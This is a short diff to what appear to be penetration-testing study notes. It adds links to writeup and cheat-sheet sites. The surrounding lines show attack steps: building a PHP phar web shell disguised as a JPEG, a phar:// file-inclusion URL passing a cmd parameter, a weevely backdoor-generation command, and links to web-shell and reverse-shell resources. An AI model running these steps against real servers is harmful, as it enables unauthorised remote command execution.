@@ -6,6 +6,8 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 
 https://allthewriteups.gitbook.io/book/
+https://0xrick.github.io/categories/
+https://0xdf.gitlab.io/cheatsheets/
 
 #weevely tool
 weevely generate 123456 /root/shell.php
@@ -54,4 +56,5 @@ https://github.com/topics/web-shell
 https://github.com/fuzzdb-project/fuzzdb (important)
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 
